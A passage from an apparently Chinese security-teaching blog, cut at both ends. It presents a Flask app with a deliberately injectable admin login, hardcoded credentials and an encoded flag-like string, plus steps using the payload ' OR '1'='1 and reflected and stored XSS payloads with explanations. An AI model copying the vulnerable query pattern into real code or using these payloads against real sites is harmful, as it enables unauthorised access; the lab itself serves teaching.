class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, redirect, url_for, render_template, session</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_sqlalchemy <span class=\"keyword\">import</span> SQLAlchemy</span><br><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</span><br><span class=\"line\"><span class=\"keyword\">from</span> sqlalchemy.sql <span class=\"keyword\">import</span> text</span><br><span class=\"line\"><span class=\"keyword\">from</span> functools <span class=\"keyword\">import</span> wraps</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config[<span class=\"string\">&#x27;SECRET_KEY&#x27;</span>] = <span class=\"string\">&#x27;zheshiyigeanquanmiyaoo~&#x27;</span></span><br><span class=\"line\">app.config[<span class=\"string\">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class=\"string\">&#x27;sqlite:///signin.db&#x27;</span></span><br><span class=\"line\">db = SQLAlchemy(app)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 用户模块</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span>(db.Model):</span><br><span class=\"line\">    <span class=\"built_in\">id</span> = db.Column(db.Integer, primary_key=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    username = db.Column(db.String(<span class=\"number\">80</span>), unique=<span class=\"literal\">True</span>, nullable=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    password = db.Column(db.String(<span class=\"number\">80</span>), nullable=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    sign_ins = db.relationship(<span class=\"string\">&#x27;SignIn&#x27;</span>, backref=<span class=\"string\">&#x27;user&#x27;</span>, lazy=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 签到记录模块</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SignIn</span>(db.Model):</span><br><span class=\"line\">    <span class=\"built_in\">id</span> = db.Column(db.Integer, primary_key=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    sign_in_time = db.Column(db.DateTime, default=datetime.utcnow)</span><br><span class=\"line\">    user_id = db.Column(db.Integer, db.ForeignKey(<span class=\"string\">&#x27;user.id&#x27;</span>), nullable=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建数据库表格</span></span><br><span class=\"line\"><span class=\"meta\">@app.before_request</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create_tables</span>():</span><br><span class=\"line\">    db.create_all()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 登录检查装饰器</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">login_required</span>(<span class=\"params\">f</span>):</span><br><span class=\"line\"><span class=\"meta\">    @wraps(<span class=\"params\">f</span>)</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">decorated_function</span>(<span class=\"params\">*args, **kwargs</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;user_id&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> session:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;login&#x27;</span>))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> f(*args, **kwargs)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> decorated_function</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 管理员权限检查装饰器</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">admin_required</span>(<span class=\"params\">f</span>):</span><br><span class=\"line\"><span class=\"meta\">    @wraps(<span class=\"params\">f</span>)</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">decorated_function</span>(<span class=\"params\">*args, **kwargs</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> session.get(<span class=\"string\">&#x27;admin&#x27;</span>) != <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;admin_login&#x27;</span>))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> f(*args, **kwargs)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> decorated_function</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 主页</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;index.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 用户注册</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/register&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">register</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:</span><br><span class=\"line\">        username = request.form[<span class=\"string\">&#x27;username&#x27;</span>]</span><br><span class=\"line\">        password = request.form[<span class=\"string\">&#x27;password&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> username <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> password:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;用户名和密码不能为空&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> User.query.filter_by(username=username).first():</span><br><span class=\"line\">            new_user = User(username=username, password=password)</span><br><span class=\"line\">            db.session.add(new_user)</span><br><span class=\"line\">            db.session.commit()</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;login&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;register.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 用户登录</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/login&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">login</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:</span><br><span class=\"line\">        username = request.form[<span class=\"string\">&#x27;username&#x27;</span>]</span><br><span class=\"line\">        password = request.form[<span class=\"string\">&#x27;password&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> username <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> password:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;用户名和密码不能为空&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        user = User.query.filter_by(username=username, password=password).first()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> user:</span><br><span class=\"line\">            session[<span class=\"string\">&#x27;user_id&#x27;</span>] = user.<span class=\"built_in\">id</span></span><br><span class=\"line\">            session[<span class=\"string\">&#x27;admin&#x27;</span>] = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;signin&#x27;</span>))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;登录失败&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;login.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 签到</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/signin&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"meta\">@login_required</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signin</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:</span><br><span class=\"line\">        new_sign_in = SignIn(user_id=session[<span class=\"string\">&#x27;user_id&#x27;</span>])</span><br><span class=\"line\">        db.session.add(new_sign_in)</span><br><span class=\"line\">        db.session.commit()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">&#x27;签到成功！&#x27;</span>)</span><br><span class=\"line\">                <span class=\"string\">&#x27;LFXXKIDNMF4SA3TFMVSCA5DPEB2XGZJAM5ZG65LQEBSW4Y3SPFYHI2LPNYQQ====&#x27;</span></span><br><span class=\"line\">                <span class=\"string\">&#x27;86,106,74,87,99,49,107,121,79,88,82,97,85,49,86,53,84,85,104,83,100,107,112,85,83,88,100,107,82,50,104,119,89,51,108,86,101,85,49,70,98,70,82,82,77,69,49,115,84,87,112,67,77,49,112,88,83,87,120,78,97,107,74,52,90,70,100,87,101,109,82,72,98,72,90,105,97,86,85,122,85,108,86,79,100,109,74,116,90,72,108,90,87,70,73,120,89,107,100,71,77,71,70,88,79,88,86,106,101,86,86,53,84,85,99,53,100,85,112,85,83,88,100,107,82,48,90,121,89,86,99,49,98,107,112,85,83,88,100,90,86,122,86,50,90,69,100,111,98,71,78,112,86,88,108,78,83,69,52,119,87,108,104,66,98,69,49,113,81,106,66,105,77,50,82,111,89,50,49,83,101,107,112,85,83,88,100,90,98,107,112,115,87,86,100,48,99,71,74,116,89,50,120,78,97,107,73,119,89,85,104,75,100,109,82,88,90,71,57,75,86,69,108,52,83,108,82,74,100,49,82,116,79,84,78,75,86,69,108,51,87,86,78,86,101,85,49,73,85,109,120,105,87,69,74,50,89,50,49,71,101,87,86,84,86,88,108,78,83,69,74,53,89,106,73,120,100,50,82,68,86,88,108,78,82,50,120,54,83,108,82,74,100,49,111,121,98,68,74,97,86,122,82,115,84,87,112,66,100,69,112,85,83,88,100,107,82,50,104,115,83,108,82,74,100,49,108,88,85,110,82,104,86,122,86,119,89,122,78,83,101,86,108,89,85,110,90,106,97,86,86,53,84,106,78,78,98,69,49,113,81,109,104,90,77,107,53,50,90,70,99,49,77,69,112,85,83,88,100,104,87,69,49,115,84,87,112,66,98,69,52,119,83,107,112,86,77,69,53,69,87,72,112,74,100,48,49,113,85,109,90,106,77,110,81,49,87,68,66,119,97,70,107,121,100,71,90,83,83,70,86,115,84,106,66,82,100,85,112,85,83,88,100,87,82,50,104,119,89,51,108,86,101,85,49,72,77,87,104,108,85,49,86,53,84,85,100,75,98,69,112,85,83,88,100,107,98,86,90,53,90,86,78,86,101,85,49,73,86,110,112,97,86,49,111,120,89,107,77,49,81,50,82,89,85,87,120,78,97,107,73,119,89,85,100,86,98,69,49,113,81,109,104,97,82,122,70,119,89,109,49,115,101,109,82,73,83,109,104,107,82,122,108,53,83,108,82,74,100,50,78,72,82,110,112,106,77,50,82,50,89,50,49,82,98,69,49,113,81,109,112,90,86,122,86,49,89,106,78,82,98,69,49,113,81,109,108,97,85,49,86,53,84,85,100,87,97,71,77,121,98,72,78,108,85,49,86,53,84,85,104,83,100,109,74,72,85,87,120,78,97,107,73,119,89,110,108,86,101,85,49,73,98,72,90,107,85,49,86,53,85,88,108,86,101,85,49,72,84,110,90,105,98,108,74,119,89,109,53,87,98,69,112,85,83,88,100,97,87,71,104,51,89,107,99,53,101,87,70,88,78,87,53,75,86,69,108,52&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;signin.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 管理员登录</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/admin&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">admin_login</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;POST&#x27;</span>:</span><br><span class=\"line\">        username = request.form[<span class=\"string\">&#x27;username&#x27;</span>]</span><br><span class=\"line\">        password = request.form[<span class=\"string\">&#x27;password&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 设置一个专门的管理员账号密码</span></span><br><span class=\"line\">        admin_username = <span class=\"string\">&#x27;ISCC_2024_sky_Jack_Du&#x27;</span></span><br><span class=\"line\">        admin_password = <span class=\"string\">&#x27;sky_1s_S0_h@NdsOme~_1234678910&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 检查是否是特定管理员</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> username == admin_username:</span><br><span class=\"line\">            <span class=\"comment\"># 允许使用 SQL 注入，仅当用户名为 &quot;sky&quot;</span></span><br><span class=\"line\">            query = text(<span class=\"string\">f&quot;SELECT * FROM user WHERE username = &#x27;<span class=\"subst\">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class=\"subst\">&#123;password&#125;</span>&#x27;&quot;</span>)</span><br><span class=\"line\">            result = db.session.execute(query).fetchone()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result:</span><br><span class=\"line\">                session[<span class=\"string\">&#x27;admin&#x27;</span>] = <span class=\"literal\">True</span></span><br><span class=\"line\">                session[<span class=\"string\">&#x27;user_id&#x27;</span>] = result.<span class=\"built_in\">id</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;admin_dashboard&#x27;</span>))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&#x27;登录失败&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 对于其他用户, 使用普通的安全验证</span></span><br><span class=\"line\">            user = User.query.filter_by(admin_username=username,admin_password=password).first()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> user:</span><br><span class=\"line\">                session[<span class=\"string\">&#x27;admin&#x27;</span>] = <span class=\"literal\">True</span></span><br><span class=\"line\">                session[<span class=\"string\">&#x27;user_id&#x27;</span>] = user.<span class=\"built_in\">id</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">&#x27;admin_dashboard&#x27;</span>))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">&#x27;登录失败&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;admin_login.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 后台面板</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/admin/dashboard&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"meta\">@login_required</span></span><br><span class=\"line\"><span class=\"meta\">@admin_required</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">admin_dashboard</span>():</span><br><span class=\"line\">    sign_ins = SignIn.query.<span class=\"built_in\">all</span>()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;admin_dashboard.html&#x27;</span>, sign_ins=sign_ins)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(debug=<span class=\"literal\">True</span>, host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, port=<span class=\"number\">8848</span>)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"详细步骤\"><a class=\"anchor\" href=\"#详细步骤\">#</a> 详细步骤</h3>\n<ol>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1weXRob25hcHAtNWI2bnk1MWZmeGR3NTBqNGt5Y3R0eGEucHk=\">在 python 环境下运行 app.py</span>。app.py 配置推荐使用 Pycharm,requirements 为：</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flask==3.0.3</span><br><span class=\"line\">flask_sqlalchemy==3.1.1</span><br><span class=\"line\">SQLAlchemy==2.0.30</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/09/b5QUaz2okmL8qSM.png\" alt=\"QQ_1720497160019.png\" /></p>\n</li>\n<li>\n<p>在浏览器输入 http://127.0.0.1:8848 或者 localhost:8848 登录页面</p>\n</li>\n<li>\n<p>点击管理员入口</p>\n</li>\n<li>\n<p>在管理员界面账号输入 <code>ISCC_2024_sky_Jack_Du</code></p>\n</li>\n<li>\n<p>密码输入 <code>' OR '1'='1</code></p>\n</li>\n<li>\n<p>点击登录，进入后台</p>\n</li>\n<li>\n<p><img data-src=\"https://s2.loli.net/2024/07/09/CyudBa3VrTSwqig.png\" alt=\"QQ_1720497597660.png\" /></p>\n</li>\n</ol>\n<h3 id=\"思考\"><a class=\"anchor\" href=\"#思考\">#</a> 思考</h3>\n<ul>\n<li>分析代码：为什么 username 不能使用 <code>' OR '1'='1</code>  进行注入？</li>\n<li>分析代码：为什么 password 进行注入的时候，username 必须为 <code>ISCC_2024_sky_Jack_Du</code> ？</li>\n<li>SQL 的原理是什么？你能把注入后代码判定的流程解释清楚吗？</li>\n</ul>\n<h1 id=\"xss攻击\"><a class=\"anchor\" href=\"#xss攻击\">#</a> XSS 攻击</h1>\n<p>XSS 攻击是通过在目标网站中注入恶意脚本，使得这些脚本在其他用户的浏览器中执行，通常用于窃取用户的敏感信息、劫持用户会话或者进行其他恶意操作。XSS 攻击主要分为三类：存储型 XSS、反射型 XSS 和基于 DOM 的 XSS。</p>\n<h3 id=\"存储型xssstored-xss\"><a class=\"anchor\" href=\"#存储型xssstored-xss\">#</a> 存储型 XSS（Stored XSS）</h3>\n<ul>\n<li>攻击者将恶意脚本提交到目标网站的数据库中。</li>\n<li>当其他用户访问包含恶意脚本的页面时，脚本会在用户的浏览器中执行。</li>\n<li>这种攻击常见于留言板、评论区或用户资料页面。</li>\n</ul>\n<h3 id=\"反射型xssreflected-xss\"><a class=\"anchor\" href=\"#反射型xssreflected-xss\">#</a> 反射型 XSS（Reflected XSS）</h3>\n<ul>\n<li>攻击者构造一个包含恶意脚本的 URL 并诱使用户点击。</li>\n<li>服务器将 URL 中的恶意脚本反射回响应中，直接在用户的浏览器中执行。</li>\n<li>这种攻击常见于搜索结果页面或错误信息页面。</li>\n</ul>\n<h3 id=\"基于dom的xssdom-based-xss\"><a class=\"anchor\" href=\"#基于dom的xssdom-based-xss\">#</a> 基于 DOM 的 XSS（DOM-based XSS）</h3>\n<ul>\n<li>恶意脚本在客户端通过修改 DOM（文档对象模型）直接执行。</li>\n<li>攻击者利用客户端的 JavaScript 代码动态生成恶意脚本，通常不经过服务器。</li>\n</ul>\n<h2 id=\"实验\"><a class=\"anchor\" href=\"#实验\">#</a> 实验</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VuanVuRHUvWFNTLWV4YW5wbGU=\">实验链接</span>:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VuanVuRHUvWFNTLWV4YW5wbGU=\">https://github.com/EnjunDu/XSS-exanple</span></p>\n<h3 id=\"前期准备\"><a class=\"anchor\" href=\"#前期准备\">#</a> 前期准备</h3>\n<ol>\n<li>download 实验材料</li>\n<li>fork and star</li>\n<li>安装 VMware 虚拟机</li>\n<li>安装 kali or Ubuntu</li>\n</ol>\n<h3 id=\"实验开始\"><a class=\"anchor\" href=\"#实验开始\">#</a> 实验开始</h3>\n<ol>\n<li>先打开终端运行 sudo apt install python3 安装 python3 环境</li>\n<li>采用 sudo apt update 和 sudo apt install python3-flask -y 来安装 Flask 框架</li>\n<li>在 kali 中创建 XSS_example 文件夹，包含已经给出的代码资料。</li>\n<li>打开到目录后右键，点击 Open Terminal Here 调用终端</li>\n<li>在终端上输入命令 python <span class=\"exturl\" data-url=\"aHR0cDovL2FwcC5weQ==\">app.py</span>，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hcHAtbzk5Zmg2Nmwyb2oucHk=\">来运行 app.py</span></li>\n<li>可通过在浏览器访问地址 localhost:5000 或者 127.0.0.1:5000 来访问该地址</li>\n</ol>\n<h3 id=\"正式操作\"><a class=\"anchor\" href=\"#正式操作\">#</a> 正式操作</h3>\n<h4 id=\"xss反射型实验\"><a class=\"anchor\" href=\"#xss反射型实验\">#</a> XSS 反射型实验</h4>\n<p>在浏览器 url 输入框里输入：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:5000/?content=&lt;script&gt;alert(&#x27;XSS反射实验成功！&#x27;)&lt;/script&gt;&amp;submit=提交</span><br></pre></td></tr></table></figure></p>\n<p>后回车，如果出现 “XSS 反射实验成功，则说明攻击成功”</p>\n<h4 id=\"xss存储型攻击\"><a class=\"anchor\" href=\"#xss存储型攻击\">#</a> XSS 存储型攻击</h4>\n<p>在评论栏输入：</p>\n<p><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#&quot;</span> <span class=\"attr\">onclick</span>=<span class=\"string\">&quot;window.location=&#x27;https://www.yuanshen.com&#x27;;&quot;</span>&gt;</span>XSS持久型攻击——原神，启动！<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>后回车点击提交，然后在评论框点击 “原神，启动！”，如果跳转至原神官网则说明攻击成功。</p>\n<h3 id=\"实验思考为何能成功\"><a class=\"anchor\" href=\"#实验思考为何能成功\">#</a> 实验思考 —— 为何能成功？</h3>\n<h4 id=\"xss反射型\"><a class=\"anchor\" href=\"#xss反射型\">#</a> XSS 反射型</h4>\n<p>反射型 XSS 攻击的成功原因主要是由于服务器<strong>没有对用户输入的内容进行任何过滤或编码处理</strong>，直接将其反射回页面。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">query = request.args.get(<span class=\"string\">&quot;content&quot;</span>).strip()</span><br><span class=\"line\"><span class=\"keyword\">if</span> query:</span><br><span class=\"line\">    sub_dataset = [x <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> dataset <span class=\"keyword\">if</span> query <span class=\"keyword\">in</span> x]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>, query=query, comments=sub_dataset)</span><br></pre></td></tr></table></figure></p>\n<p>用户通过 URL 参数传递恶意脚本：</p>\n<p><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:5000/?content=<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"title function_\">alert</span>(<span class=\"string\">&#x27;XSS反射实验成功！&#x27;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>&amp;submit=提交</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>服务器将 URL 参数 <code>content</code>  的值直接传递给变量 <code>query</code> ，没有进行任何过滤或编码。服务器获取 <code>content</code>  参数的值（ <code>&lt;script&gt;alert('XSS反射实验成功！')&lt;/script&gt;</code> ），并将其赋值给变量 <code>query</code> 。</li>\n<li>在生成 HTML 页面时，变量 <code>query</code>  被直接渲染到模板中，这意味着任何 HTML 或 JavaScript 代码都会被浏览器解析和执行。</li>\n</ul>\n<h4 id=\"xss存储型\"><a class=\"anchor\" href=\"#xss存储型\">#</a> XSS 存储型</h4>\n<p>存储型 XSS 攻击的成功原因主要是由于服务器在处理用户提交的内容时，没有对其进行任何过滤或编码处理，直接将其存储并在页面中展示。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">comment = request.form.get(<span class=\"string\">&quot;newComment&quot;</span>).strip()</span><br><span class=\"line\"><span class=\"keyword\">if</span> comment:</span><br><span class=\"line\">    dataset.append(comment)</span><br></pre></td></tr></table></figure></p>\n<p>用户通过表单提交恶意脚本：</p>\n<p><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 